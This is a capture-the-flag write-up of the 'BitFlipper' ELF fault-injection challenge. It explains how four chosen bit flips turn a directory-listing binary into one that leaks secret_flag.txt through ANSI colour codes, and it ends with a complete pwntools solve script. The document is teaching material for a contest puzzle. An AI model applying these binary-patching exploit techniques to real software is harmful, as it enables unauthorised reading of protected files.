# BitFlipper

When we first connect to the service, we are prompted with:

```-------------------------------------------------------
      Bitflipper - ELF Fault Injection Framework
-------------------------------------------------------
Test program md5:  30acc4aee186d6aef8e9e2036008a710
-------------------------------------------------------
How many faults you want to introduce?```

After playing around with this for a while, I discover:
- This service flips the bits of an ELF binary
- You can introduce at most 4 faults
- Server runs the binary
- Introducing 0 bits does a fancy directory listing
- Server will dump any core files in the directory

The files are as follows:
```README
abc.jpg
archive.zip
beta.doc
celtic.png
dir
secret_flag.txt
test.doc
version.txt
```

If we make the binary a core file, then the server will give it to us! We can do this by looking at the wikipedia for ELF headers (https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) and see that if the value at offset 0x10 is 4, then it is a core file. So we flip the byte at offset 0x10 to a 4, and the server returns the ELF binary.

I first started with static analysis. Loading it into IDA, we begin to reverse engineer it. Here is what it does:

1) opens current directory and loads all filenames into an array
2) opens ".dircolors" and loads the value before a newline into a global array, we will call this the colors array
3) iterates through filename array and prints the filename the color loaded in the colors array

We only have four bits to flip, so that suggests that our changes will have to be within the existing code. First thing's first, the absolute necessity is to have an open filestream to the secret_flag.txt. Otherwise, we would never be able to access its contents. Since we only have four bits, we have to reuse code. Looking at step 2 above, in that function we see that the binary opens a file, reads it into a bufer, then gets loaded into a buffer.

To find out how to open the file, I began performing dynamic analysis. Setting a breakpoint right before the open function where the string pointer to ".dircolors" is loaded into rdi, I find that right before it's loaded, rdi is pointing to a filename! More specifically, the first file in my directory. So, if we change this instruction to load the string pointer to some register we don't care about, then the open function performs open on the first file! I changed mov rdi, filepointer to mov rdx, filepointer using the bit flip at offset 0xdb0*8+5.

Now that we have a open primitive, we want to get it to open our flag file. To do this, we can look in the main function and see that there is a check for the first character of the filename in the directory:

```
v11->d_name[0] > 47 && v11->d_name[0] <= 122
```

So we can actually change the lower bound of this ascii check to something higher than ord('d'). Thus, everything before secret_flag.txt will be cut off, and the flag will be the first file which then gets passed to open. I did this by flipping the bit at 0xfcf*8+6.

Now, we have to read the flag that is loaded into memory with 2 bits left. After the flag contents is loaded into a buffer, it eventually gets freed. So I thought if you change free(buf) to printf(buf), then it would print the flag! We can do this with 2 bits too. However, when I tried this, I got: 

```
ALARM!!
The output contained the content of a local file.
This is in violation of the security policy --> the exfiltration attempt has been blocked!!
```

Drats. What kind of alarm is this >:(

So the correct way to do it is to change the newline check when iterating through the buffer from if ( *((_BYTE *)buf + v1) == 10 ) to if ( *((_BYTE *)buf + v1) != 10 ). This ensures that every character in buf gets put into the colors array, instead of just the last character. I did this using offset 0xe85*8. Next we look in main and see that there is a check to only print each filename once:

```
v5 = 0;
    for ( k = 0; k <= 15 && v5 == 0 && qword_202040[k]; ++k )
    {
      if ( strstr(*j, *qword_202040[k]) )
      {
        printf("\x1B[%dm%s\x1B[0m\n", (unsigned int)(*((_DWORD *)qword_202040[k] + 2) + 30), *j, v4);
        v5 = 1;
      }
    }
 ```

The colors array is iterated, however it only gets printed once because of v5. So, if we change v5 = 1 to v5 = 0, then everything in colors array will get printed. This is offset 0x10fb*8.

Now using these four bit flips, we run it on the server and get:

```
['\x1b[-18msecret_flag.txt\x1b[0m', '\x1b[80msecret_flag.txt\x1b[0m', '\x1b[87msecret_flag.txt\x1b[0m', '\x1b[98msecret_flag.txt\x1b[0m', '\x1b[84msecret_flag.txt\x1b[0m', '\x1b[90msecret_flag.txt\x1b[0m', '\x1b[87msecret_flag.txt\x1b[0m', '\x1b[94msecret_flag.txt\x1b[0m', '\x1b[77msecret_flag.txt\x1b[0m', '\x1b[91msecret_flag.txt\x1b[0m', '\x1b[79msecret_flag.txt\x1b[0m', '\x1b[82msecret_flag.txt\x1b[0m', '\x1b[92msecret_flag.txt\x1b[0m', '\x1b[83msecret_flag.txt\x1b[0m', '\x1b[97msecret_flag.txt\x1b[0m', '\x1b[97msecret_flag.txt\x1b[0m', 'secret_flag.txt', '\x1b[-18mtest.doc\x1b[0m', '\x1b[80mtest.doc\x1b[0m', '\x1b[87mtest.doc\x1b[0m', '\x1b[98mtest.doc\x1b[0m', '\x1b[84mtest.doc\x1b[0m', '\x1b[90mtest.doc\x1b[0m', '\x1b[87mtest.doc\x1b[0m', '\x1b[94mtest.doc\x1b[0m', '\x1b[77mtest.doc\x1b[0m', '\x1b[91mtest.doc\x1b[0m', '\x1b[79mtest.doc\x1b[0m', '\x1b[82mtest.doc\x1b[0m', '\x1b[92mtest.doc\x1b[0m', '\x1b[83mtest.doc\x1b[0m', '\x1b[97mtest.doc\x1b[0m', '\x1b[97mtest.doc\x1b[0m', 'test.doc', '\x1b[-18mversion.txt\x1b[0m', '\x1b[80mversion.txt\x1b[0m', '\x1b[87mversion.txt\x1b[0m', '\x1b[98mversion.txt\x1b[0m', '\x1b[84mversion.txt\x1b[0m', '\x1b[90mversion.txt\x1b[0m', '\x1b[87mversion.txt\x1b[0m', '\x1b[94mversion.txt\x1b[0m', '\x1b[77mversion.txt\x1b[0m', '\x1b[91mversion.txt\x1b[0m', '\x1b[79mversion.txt\x1b[0m', '\x1b[82mversion.txt\x1b[0m', '\x1b[92mversion.txt\x1b[0m', '\x1b[83mversion.txt\x1b[0m', '\x1b[97mversion.txt\x1b[0m', '\x1b[97mversion.txt\x1b[0m', 'version.txt', '', '-------------------------------------------------------']
```

Extracting the decimal values before m, ['80', '87', '98', '84', '90', '87', '94', '77', '91', '79', '82', '92', '83', '97', '97'], then converting it to ascii gives us gibberish. The reason is because of these two lines:

```
*((_DWORD *)v3 + 2) -= 48;
printf("\x1B[%dm%s\x1B[0m\n", (unsigned int)(*((_DWORD *)qword_202040[k] + 2) + 30), *j, v4);
```

When the value is being loaded, it gets subtracted by 48. When it is being printed, 30 is added to its value. Therefore we have to add 18 to each decimal value for the flag.

Solve script:
```python
from pwn import *
def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0
def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1
p=remote('61421a06.quals2018.oooverflow.io', 5566)
p.recvuntil("Challenge: ")
x=p.recvline()[:-1]
p.recvuntil("n: ")
y=int(p.recvline()[:-1])
p.recv()
ans=solve_pow(x,y)
p.sendline(str(ans))

openheap=0xdb0*8+5
lowlim = 0xfcf*8
jnz = 0xe85*8
foundcolor = 0x10fb*8
p.sendline("4")
p.sendline(str(jnz))
p.sendline(str(openheap))
p.sendline(str(lowlim+6))
p.sendline(str(foundcolor))
p.recvuntil("now...")
p.recvuntil("-------------------------------------------------------")
sice = p.recvuntil("-------------------------------------------------------").strip().split("\n")

flag = ""
for i in sice:
    flag += chr(int(i.strip("\x1b[").split("m")[0]) + 18)
    print flag

p.interactive()
```

## Flag: bitflip_madness
